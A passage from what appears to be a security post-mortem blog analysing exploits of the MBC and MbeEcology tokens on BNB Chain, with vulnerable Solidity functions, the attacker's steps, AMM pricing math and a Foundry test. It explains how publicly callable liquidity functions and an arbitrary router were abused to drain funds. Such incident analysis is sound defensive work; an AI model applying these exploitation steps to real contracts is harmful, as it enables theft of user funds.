</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">);</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>_baseToken<span class="p">);</span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">    </span>uniswapV2Router<span class="p">.</span>swapExactTokensForTokensSupportingFeeOnTransferTokens<span class="p">(</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">        </span>tokenAmount<span class="p">,</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">        </span>path<span class="p">,</span>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span>warp<span class="p">),</span>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">        </span><span class="k">block.timestamp</span>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="w">    </span>warp<span class="p">.</span>withdraw<span class="p">();</span>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="p">}</span>
</span></code></pre></div>
<p>Actually, it swaps half of the contract's token to USDT. Then, it uses the remaining token along with the converted USDT to call <code>addLiquidityUsdt</code> and add liquidity for the <code>tokenOwner</code>. Since adding liquidity calculates the input amounts based on the actual reserves in the pool, it may leave some USDT in the contract, which is why the contract holds USDT.</p>
<p>Overall, this vulnerable token is designed with the following logic: during token transfer, if it's not transferring out of the pool (i.e., exchanging USDT for contract tokens), doesn't involve <code>tokenOwner</code>, and the <code>_isAddLiquidityV1</code> function confirms it's not adding liquidity, then the <code>swapAndLiquify</code> function is executed. This function converts half of the contract's tokens into USDT and adds liquidity for <code>tokenOwner</code>.</p>
<p>Therefore, for the attacker to exploit, they need to avoid executing <code>swapAndLiquify</code>. Otherwise, if the contract executes <code>swap</code> beforehand, it would lower the price of tokens during the attacker's exchange, rendering them unable to profit. Simply by transferring USDT before transferring (swap) target tokens, making it appear as liquidity addition, can circumvent this situation. According to the code logic, a minimum transfer of 1001 would suffice.</p>
<p>(However, this design seems to result in higher slippage for regular users selling the tokens when the contract balance exceeds a certain threshold, akin to someone frontrunning and selling ahead.)</p>
<h3 id="attack-flow">Attack Flow</h3>
<p>Analyzing the entire attack flow from the <a href="https://bscscan.com/address/0x9cc3270De4A3948449C1A73eABff5D0275f60785">attacker's address</a>:</p>
<p><img alt="" src="../../image/221129_MBC.assets/4953.png" /></p>
<p>First, on November 28th, at approximately 4:09 PM, the attacker deposited 1 BNB into Tornado Cash for initial attack funds.</p>
<p><img alt="" src="../../image/221129_MBC.assets/5023.png" /></p>
<p>The next day, at 1:00 PM, the attacker created a contract (profitContract) for receiving the profits and another contract (attackContract) for the attack. The attacker then called the attack contract to initiate the attack. These transactions occurred in consecutive blocks, indicating that the attacker rapidly executed these transactions directly within a script.</p>
<p><img alt="" src="../../image/221129_MBC.assets/5202.png" /></p>
<p>Two days later, on the afternoon of December 1st, at 2 PM, the attacker created another contract and invoked the <code>0xdbce5f1e</code> function.</p>
<p>Analyzing this <a href="https://explorer.phalcon.xyz/tx/bsc/0x79cd01e651eae4b0d601168af0fecad0435960fc781fe707786fdfe395963423">transaction</a>, it becomes evident that this was yet another attack involving the <a href="https://bscscan.com/address/0xe23150242448ce5474f4f881b6e26f2d2816e4c8">MbeEcology token</a>.</p>
<p>The vulnerability, once again, dues to the access control. This token has the following two <code>public</code> functions.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">swapTokensForEth</span><span class="p">(</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">routerAddress</span><span class="p">,</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tokenAmount</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w">  </span><span class="p">{</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">    </span>IRouter<span class="w"> </span>pancakeRouter<span class="w"> </span><span class="o">=</span><span class="w"> </span>IRouter<span class="p">(</span>routerAddress<span class="p">);</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">    </span><span class="c1">// generate the pancake pair path of token -&gt; weth</span>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">);</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>pancakeRouter<span class="p">.</span>WETH<span class="p">();</span>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">    </span><span class="c1">// make the swap</span>
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">    </span>pancakeRouter<span class="p">.</span>swapExactTokensForETHSupportingFeeOnTransferTokens<span class="p">(</span>
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">        </span>tokenAmount<span class="p">,</span>
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="c1">// accept any amount of BNB</span>
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="w">        </span>path<span class="p">,</span>
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="w">        </span><span class="k">block.timestamp</span>
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="p">}</span>
</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="kt">function</span><span class="w"> </span><span class="nv">addLiquidity</span><span class="p">(</span>
</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">routerAddress</span><span class="p">,</span>
</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">owner</span><span class="p">,</span>
</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tokenAmount</span><span class="p">,</span>
</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">ethAmount</span>
</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a><span class="w">    </span>IRouter<span class="w"> </span>pancakeRouter<span class="w"> </span><span class="o">=</span><span class="w"> </span>IRouter<span class="p">(</span>routerAddress<span class="p">);</span>
</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>
</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a><span class="w">    </span><span class="c1">// add the liquidity</span>
</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a><span class="w">    </span>pancakeRouter<span class="p">.</span>addLiquidityETH<span class="p">{</span>value<span class="w"> </span><span class="o">:</span><span class="w"> </span>ethAmount<span class="p">}(</span>
</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a><span class="w">        </span>tokenAmount<span class="p">,</span>
</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="c1">// slippage is unavoidable</span>
</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="c1">// slippage is unavoidable</span>
</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a><span class="w">        </span>owner<span class="p">,</span>
</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a><span class="w">        </span><span class="k">block.timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m m-Decimal">360</span>
</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a><span class="p">}</span>
</span></code></pre></div>
<p>The logic behind the <code>swapTokensForEth</code> function is to exchange the contract's tokens for BNB, while <code>addLiquidity</code> is used to add liquidity for the <code>owner</code> using the contract's balance (similar to the earlier MBC and ZZSH tokens). Clearly, both of these functions should not be marked as <code>public</code>. What makes this more severe than the other two tokens is that the address of the <code>router</code> can be arbitrarily set, allowing the creation of malicious contracts (as shown in the attacker's third contract), which can use the same function signature to implement malicious logic.</p>
<p>The attacker exploited this vulnerability by first exchanging all the tokens in the contract for BNB using the <code>swapTokensForEth</code> function. Subsequently, they used the malicious contract as the <code>router</code> and called the <code>addLiquidity</code> function, but did not implement the liquidity addition functionality. Instead, they simply transferred out all the BNB balance (<code>{value: ethAmount}</code>), ultimately gaining approximately 0.6 BNB.</p>
<p><img alt="" src="../../image/221129_MBC.assets/5541.png" /></p>
<p>Three days later, on December 4th, the attacker withdrew all the profits obtained from the attack through the <code>profitContract</code>. After converting USDT to BNB, they used Tornado Cash to further anonymize their funds and complete the exit.</p>
<h2 id="misc">Misc</h2>
<h3 id="reason-for-profit">Reason For Profit</h3>
<p>One obvious question arises: why was the attacker able to receive more USDT than initially invested after providing liquidity, even though two swaps incurred layers of fees?</p>
<p>According to Uniswap's economic model, as illustrated in the following diagram:</p>
<p><img alt="" src="../../image/221129_MBC.assets/4308.png" /></p>
<p>When the input token quantity <code>dy</code> is smaller relative to the reserve values <code>x</code> and <code>y</code> of the two tokens in the pool, the output token quantity <code>dx</code> is closer to the ratio of the reserves. Therefore, if liquidity increases, one can exchange tokens at a better price and get more tokens.</p>
<p>In the above scenario, the reserve values of the two tokens are 100,000 and 20 respectively (ETH:DAI = 1:5000), which can be simply understood as 1 ETH being worth 5000 DAI. Without considering fees, 1 ETH can be exchanged for about 4761 DAI (1:4761). However, if you use 5 ETH for the exchange, you can only get 20,000 DAI (1:4000).</p>
<p>If at this point, the reserve values of the two tokens are 200,000 and 40 respectively (ETH:DAI = 1:5000), with the relative value being the same as before but with more liquidity, without considering fees, 1 ETH can be exchanged for about 4878 DAI (1:4878). If you use 5 ETH for the exchange, you can get 22,222 DAI (1:4444).</p>
<p>Obviously, the higher the pool's liquidity (the more sufficient the reserves of the two tokens), the better the price one can get when exchanging, closer to the reserve ratio, and the more tokens one can get. This is why the attacker can get more USDT by first using a vulnerable contract to add liquidity and then exchange tokens.</p>
<h3 id="loss">Loss</h3>
<p>Another question is how much loss the victim (the vulnerable token contract / tokenOwner) suffered in this attack. In other words, the tokens were added to the pool as liquidity, and <code>tokenOwner</code> received LP tokens, so why was there still a loss? (If there was no loss, the attacker could have simply added liquidity with their own funds.)</p>
<p>Continuing with the previous example, in a pool with reserve values of 100,000 and 20 (ETH:DAI = 1:5000), a regular user added 10,000 DAI and 2 ETH to the pool, representing 10% of the liquidity. At that time, the value was calculated as 20,000 DAI. If another user sells 10 ETH into the pool, they would receive approximately 33,333 DAI. The pool would then contain 66,667 DAI and 30 ETH (ETH:DAI = 1:2,222). For the liquidity provider, their 10% share would now be worth only 13,333 DAI, which is a loss compared to the initial value without providing liquidity (10,000 DAI + 2 ETH = 14,444 DAI). This loss is known as impermanent loss.</p>
<p>It's important to note that the measurement and perception of impermanent loss depend on the chosen reference (base). Typically, stablecoins (such as the USDT obtained by the attacker and the DAI in the example above) are used as the reference, and what is concerned is how the asset value relative to this stablecoin changes. In the example, DAI is the reference, and it experienced impermanent loss. However, if ETH were the reference, the liquidity share would be equivalent to having 6 ETH, which is an increase compared to the initial value without providing liquidity (10,000 DAI + 2 ETH = 4 ETH).</p>
<p>In this attack, the <code>tokenOwner</code> added liquidity when the contract token's value was high. Subsequently, due to the attacker's swaps, the contract token's quantity increased, causing the price to drop. When viewed with USDT as the reference, impermanent loss became evident.</p>
<h3 id="bugs">Bugs</h3>
<p>During the analysis, it appears that several other bugs exist in the token contract's design.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testAddLiquidity</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1234123412341234123412341234123412341234</span><span class="p">;</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">),</span><span class="w"> </span>test<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">10000</span><span class="w"> </span>ether<span class="p">);</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>mbc<span class="p">),</span><span class="w"> </span>test<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">1000</span><span class="w"> </span>ether<span class="p">);</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">    </span>cheats<span class="p">.</span>startPrank<span class="p">(</span>test<span class="p">);</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">    </span>usdt<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>pancakeRouter<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint</span><span class="p">).</span>max<span class="p">);</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span>mbc<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>pancakeRouter<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint</span><span class="p">).</span>max<span class="p">);</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Initial mbc balance in the pool&quot;</span><span class="p">,</span><span class="w"> </span>mbc<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>mbc_usdt<span class="p">)),</span><span class="w"> </span>mbc<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Initial usdt balance in the pool&quot;</span><span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>mbc_usdt<span class="p">)),</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve0</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve1</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>mbc_usdt<span class="p">.</span>getReserves<span class="p">();</span>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Initial mbc price&quot;</span><span class="p">,</span><span class="w"> </span>pancakeRouter<span class="p">.</span>quote<span class="p">(</span><span class="m m-Decimal">1</span><span class="w"> </span>ether<span class="p">,</span><span class="w"> </span>reserve0<span class="p">,</span><span class="w"> </span>reserve1<span class="p">),</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="w">    </span>console<span class="p">.</span>log<span class="p">(</span>mbc<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>mbc<span class="p">))</span><span class="o">/</span><span class="m m-Decimal">1</span><span class="w"> </span>ether<span class="p">);</span>
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="w">    </span>pancakeRouter<span class="p">.</span>addLiquidity<span class="p">(</span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>mbc<span class="p">),</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>test<span class="p">),</span><span class="w"> </span>mbc<span class="p">.</span>balanceOf<span class="p">(</span>test<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>test<span class="p">,</span><span class="w"> </span><span class="k">block.timestamp</span><span class="p">);</span>
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="w">    </span><span class="c1">// pancakeRouter.addLiquidity(address(mbc), address(usdt), mbc.balanceOf(test), usdt.balanceOf(test), 0,0, test, block.timestamp);</span>
</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Eventually mbc balance in the pool&quot;</span><span class="p">,</span><span class="w"> </span>mbc<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>mbc_usdt<span class="p">)),</span><span class="w"> </span>mbc<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Eventually usdt balance in the pool&quot;</span><span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>mbc_usdt<span class="p">)),</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve00</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve11</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>mbc_usdt<span class="p">.</span>getReserves<span class="p">();</span>
</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Eventually mbc price&quot;</span><span class="p">,</span><span class="w"> </span>pancakeRouter<span class="p">.</span>quote<span class="p">(</span><span class="m m-Decimal">1</span><span class="w"> </span>ether<span class="p">,</span><span class="w"> </span>reserve00<span class="p">,</span><span class="w"> </span>reserve11<span class="p">),</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a>
</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="w">    </span>cheats<span class="p">.</span>stopPrank<span class="p">();</span>
</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a><span class="p">}</span>
</span></code></pre></div>
<p>In the above test code for adding liquidity, if the <code>addLiquidity</code> function receives <code>usdt</code> as the first parameter and <code>mbc</code> as the second parameter, liquidity can be added without errors, and the relative token prices obtained via the <code>quote</code> function remain largely unchanged.</p>
<p>However, if the parameters are reversed, with <code>mbc</code> first and <code>usdt</code> second, the code should function identically according to the router's implementation, but it results in an error.</p>
<p>Analysis reveals several issues with the token contract:</p>
<p>Firstly, the reason for the error:</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">swapAndLiquify</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">allAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>allAmount<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">18</span><span class="p">){</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">canswap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>allAmount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">2</span><span class="p">);</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">otherAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>allAmount<span class="p">.</span>sub<span class="p">(</span>canswap<span class="p">);</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">        </span>swapTokensForOther<span class="p">(</span>canswap<span class="p">);</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">ethBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ETH<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">        </span>addLiquidityUsdt<span class="p">(</span>ethBalance<span class="p">,</span><span class="w"> </span>otherAmount<span class="p">);</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="p">}</span>
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="kt">function</span><span class="w"> </span><span class="nv">addLiquidityUsdt</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tokenAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">usdtAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="w">    </span>uniswapV2Router<span class="p">.</span>addLiquidity<span class="p">(</span>
</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span>_baseToken<span class="p">),</span>
</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="w">        </span>usdtAmount<span class="p">,</span>
</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="w">        </span>tokenAmount<span class="p">,</span>
</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
